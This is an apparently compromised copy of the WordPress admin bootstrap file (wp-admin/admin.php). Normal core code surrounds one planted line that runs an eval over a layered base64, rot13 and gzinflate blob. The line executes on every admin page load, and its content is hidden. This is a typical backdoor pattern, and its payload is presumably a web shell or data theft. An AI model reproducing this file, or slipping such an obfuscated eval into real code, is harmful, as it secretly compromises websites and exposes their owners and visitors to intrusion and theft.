<?php
/**
 * WordPress Administration Bootstrap
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * In WordPress Administration Screens
 *
 * @since 2.3.2
 */
if ( ! defined( 'WP_ADMIN' ) ) {
	define( 'WP_ADMIN', true );
}

if ( ! defined('WP_NETWORK_ADMIN') )
	define('WP_NETWORK_ADMIN', false);

if ( ! defined('WP_USER_ADMIN') )
	define('WP_USER_ADMIN', false);

if ( ! WP_NETWORK_ADMIN && ! WP_USER_ADMIN ) {
	define('WP_BLOG_ADMIN', true);
}

if ( isset($_GET['import']) && !defined('WP_LOAD_IMPORTERS') )
	define('WP_LOAD_IMPORTERS', true);

require_once(dirname(dirname(__FILE__)) . '/wp-load.php');

nocache_headers();

if ( get_option('db_upgraded') ) {
	flush_rewrite_rules();
	update_option( 'db_upgraded',  false );

	/**
	 * Fires on the next page load after a successful DB upgrade.
	 *
	 * @since 2.8.0
	 */
	do_action( 'after_db_upgrade' );
} elseif ( get_option('db_version') != $wp_db_version && empty($_POST) ) {
	if ( !is_multisite() ) {
		wp_redirect( admin_url( 'upgrade.php?_wp_http_referer=' . urlencode( wp_unslash( $_SERVER['REQUEST_URI'] ) ) ) );
		exit;

	/**
	 * Filters whether to attempt to perform the multisite DB upgrade routine.
	 *
	 * In single site, the user would be redirected to wp-admin/upgrade.php.
	 * In multisite, the DB upgrade routine is automatically fired, but only
	 * when this filter returns true.
	 *
	 * If the network is 50 sites or less, it will run every time. Otherwise,
	 * it will throttle itself to reduce load.
	 *
	 * @since 3.0.0
	 *
	 * @param bool $do_mu_upgrade Whether to perform the Multisite upgrade routine. Default true.
	 */
	} elseif ( apply_filters( 'do_mu_upgrade', true ) ) {
		$c = get_blog_count();

		/*
		 * If there are 50 or fewer sites, run every time. Otherwise, throttle to reduce load:
		 * attempt to do no more than threshold value, with some +/- allowed.
		 */
		if ( $c <= 50 || ( $c > 50 && mt_rand( 0, (int)( $c / 50 ) ) == 1 ) ) {
			require_once( ABSPATH . WPINC . '/http.php' );
			$response = wp_remote_get( admin_url( 'upgrade.php?step=1' ), array( 'timeout' => 120, 'httpversion' => '1.1' ) );
			/** This action is documented in wp-admin/network/upgrade.php */
			do_action( 'after_mu_upgrade', $response );
			unset($response);
		}
		unset($c);
	}
}

require_once(ABSPATH . 'wp-admin/includes/admin.php');

auth_redirect();

// Schedule trash collection
if ( ! wp_next_scheduled( 'wp_scheduled_delete' ) && ! wp_installing() )
	wp_schedule_event(time(), 'daily', 'wp_scheduled_delete');

set_screen_options();

$date_format = __( 'F j, Y' );
$time_format = __( 'g:i a' );

wp_enqueue_script( 'common' );




/**
 * $pagenow is set in vars.php
 * $wp_importers is sometimes set in wp-admin/includes/import.php
 * The remaining variables are imported as globals elsewhere, declared as globals here
 *
 * @global string $pagenow
 * @global array  $wp_importers
 * @global string $hook_suffix
 * @global string $plugin_page
 * @global string $typenow
 * @global string $taxnow
 */
global $pagenow, $wp_importers, $hook_suffix, $plugin_page, $typenow, $taxnow;

$page_hook = null;

$editing = false;

if ( isset($_GET['page']) ) {
	$plugin_page = wp_unslash( $_GET['page'] );
	$plugin_page = plugin_basename($plugin_page);
}

if ( isset( $_REQUEST['post_type'] ) && post_type_exists( $_REQUEST['post_type'] ) )
	$typenow = $_REQUEST['post_type'];
else
	$typenow = '';

if ( isset( $_REQUEST['taxonomy'] ) && taxonomy_exists( $_REQUEST['taxonomy'] ) )
	$taxnow = $_REQUEST['taxonomy'];
else
	$taxnow = '';

if ( WP_NETWORK_ADMIN )
	require(ABSPATH . 'wp-admin/network/menu.php');
elseif ( WP_USER_ADMIN )
	require(ABSPATH . 'wp-admin/user/menu.php');
else
	require(ABSPATH . 'wp-admin/menu.php');

if ( current_user_can( 'manage_options' ) ) {
	wp_raise_memory_limit( 'admin' );
}

/**
 * Fires as an admin screen or script is being initialized.
 *
 * Note, this does not just run on user-facing admin screens.
 * It runs on admin-ajax.php and admin-post.php as well.
 *
 * This is roughly analogous to the more general {@see 'init'} hook, which fires earlier.
 *
 * @since 2.5.0
 */
do_action( 'admin_init' );

if ( isset($plugin_page) ) {
	if ( !empty($typenow) )
		$the_parent = $pagenow . '?post_type=' . $typenow;
	else
		$the_parent = $pagenow;
	if ( ! $page_hook = get_plugin_page_hook($plugin_page, $the_parent) ) {
		$page_hook = get_plugin_page_hook($plugin_page, $plugin_page);

		// Back-compat for plugins using add_management_page().
		if ( empty( $page_hook ) && 'edit.php' == $pagenow && '' != get_plugin_page_hook($plugin_page, 'tools.php') ) {
			// There could be plugin specific params on the URL, so we need the whole query string
			if ( !empty($_SERVER[ 'QUERY_STRING' ]) )
				$query_string = $_SERVER[ 'QUERY_STRING' ];
			else
				$query_string = 'page=' . $plugin_page;
			wp_redirect( admin_url('tools.php?' . $query_string) );
			exit;
		}
	}
	unset($the_parent);
}

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

$hook_suffix = '';
if ( isset( $page_hook ) ) {
	$hook_suffix = $page_hook;
} elseif ( isset( $plugin_page ) ) {
	$hook_suffix = $plugin_page;
} elseif ( isset( $pagenow ) ) {
	$hook_suffix = $pagenow;
}

set_current_screen();

// Handle plugin admin pages.
if ( isset($plugin_page) ) {
	if ( $page_hook ) {
		/**
		 * Fires before a particular screen is loaded.
		 *
		 * The load-* hook fires in a number of contexts. This hook is for plugin screens
		 * where a callback is provided when the screen is registered.
		 *
		 * The dynamic portion of the hook name, `$page_hook`, refers to a mixture of plugin
		 * page information including:
		 * 1. The page type. If the plugin page is registered as a submenu page, such as for
		 *    Settings, the page type would be 'settings'. Otherwise the type is 'toplevel'.
		 * 2. A separator of '_page_'.
		 * 3. The plugin basename minus the file extension.
		 *
		 * Together, the three parts form the `$page_hook`. Citing the example above,
		 * the hook name used would be 'load-settings_page_pluginbasename'.
		 *
		 * @see get_plugin_page_hook()
		 *
		 * @since 2.1.0
		 */
		do_action( "load-{$page_hook}" );
		if (! isset($_GET['noheader']))
			require_once(ABSPATH . 'wp-admin/admin-header.php');

		/**
		 * Used to call the registered callback for a plugin screen.
		 *
		 * @ignore
		 * @since 1.5.0
		 */
		do_action( $page_hook );
	} else {
		if ( validate_file( $plugin_page ) ) {
			wp_die( __( 'Invalid plugin page.' ) );
		}

		if ( !( file_exists(WP_PLUGIN_DIR . "/$plugin_page") && is_file(WP_PLUGIN_DIR . "/$plugin_page") ) && !( file_exists(WPMU_PLUGIN_DIR . "/$plugin_page") && is_file(WPMU_PLUGIN_DIR . "/$plugin_page") ) )
			wp_die(sprintf(__('Cannot load %s.'), htmlentities($plugin_page)));

		/**
		 * Fires before a particular screen is loaded.
		 *
		 * The load-* hook fires in a number of contexts. This hook is for plugin screens
		 * where the file to load is directly included, rather than the use of a function.
		 *
		 * The dynamic portion of the hook name, `$plugin_page`, refers to the plugin basename.
		 *
		 * @see plugin_basename()
		 *
		 * @since 1.5.0
		 */
		do_action( "load-{$plugin_page}" );

		if ( !isset($_GET['noheader']))
			require_once(ABSPATH . 'wp-admin/admin-header.php');

		if ( file_exists(WPMU_PLUGIN_DIR . "/$plugin_page") )
			include(WPMU_PLUGIN_DIR . "/$plugin_page");
		else
			include(WP_PLUGIN_DIR . "/$plugin_page");
	}

	include(ABSPATH . 'wp-admin/admin-footer.php');

	exit();
} elseif ( isset( $_GET['import'] ) ) {

	$importer = $_GET['import'];

	if ( ! current_user_can( 'import' ) ) {
		wp_die( __( 'Sorry, you are not allowed to import content.' ) );
	}

	if ( validate_file($importer) ) {
		wp_redirect( admin_url( 'import.php?invalid=' . $importer ) );
		exit;
	}

	if ( ! isset($wp_importers[$importer]) || ! is_callable($wp_importers[$importer][2]) ) {
		wp_redirect( admin_url( 'import.php?invalid=' . $importer ) );
		exit;
	}

	/**
	 * Fires before an importer screen is loaded.
	 *
	 * The dynamic portion of the hook name, `$importer`, refers to the importer slug.
	 *
	 * @since 3.5.0
	 */
	do_action( "load-importer-{$importer}" );

	$parent_file = 'tools.php';
	$submenu_file = 'import.php';
	$title = __('Import');

	if (! isset($_GET['noheader']))
		require_once(ABSPATH . 'wp-admin/admin-header.php');

	require_once(ABSPATH . 'wp-admin/includes/upgrade.php');

	define('WP_IMPORTING', true);

	/**
	 * Whether to filter imported data through kses on import.
	 *
	 * Multisite uses this hook to filter all data through kses by default,
	 * as a super administrator may be assisting an untrusted user.
	 *
	 * @since 3.1.0
	 *
	 * @param bool $force Whether to force data to be filtered through kses. Default false.
	 */
	if ( apply_filters( 'force_filtered_html_on_import', false ) ) {
		kses_init_filters();  // Always filter imported data with kses on multisite.
	}

	call_user_func($wp_importers[$importer][2]);

	include(ABSPATH . 'wp-admin/admin-footer.php');

	// Make sure rules are flushed
	flush_rewrite_rules(false);

	exit();
} else {
	/**
	 * Fires before a particular screen is loaded.
	 *
	 * The load-* hook fires in a number of contexts. This hook is for core screens.
	 *
	 * The dynamic portion of the hook name, `$pagenow`, is a global variable
	 * referring to the filename of the current page, such as 'admin.php',
	 * 'post-new.php' etc. A complete hook for the latter would be
	 * 'load-post-new.php'.
	 *
	 * @since 2.1.0
	 */
	do_action( "load-{$pagenow}" );

	/*
	 * The following hooks are fired to ensure backward compatibility.
	 * In all other cases, 'load-' . $pagenow should be used instead.
	 */
	if ( $typenow == 'page' ) {
		if ( $pagenow == 'post-new.php' )
			do_action( 'load-page-new.php' );
		elseif ( $pagenow == 'post.php' )
			do_action( 'load-page.php' );
	}  elseif ( $pagenow == 'edit-tags.php' ) {
		if ( $taxnow == 'category' )
			do_action( 'load-categories.php' );
		elseif ( $taxnow == 'link_category' )
			do_action( 'load-edit-link-categories.php' );
	} elseif( 'term.php' === $pagenow ) {
		do_action( 'load-edit-tags.php' );
	}
}

if ( ! empty( $_REQUEST['action'] ) ) {
	/**
	 * Fires when an 'action' request variable is sent.
	 *
	 * The dynamic portion of the hook name, `$_REQUEST['action']`,
	 * refers to the action derived from the `GET` or `POST` request.
	 *
	 * @since 2.6.0
	 */
	do_action( 'admin_action_' . $_REQUEST['action'] );
}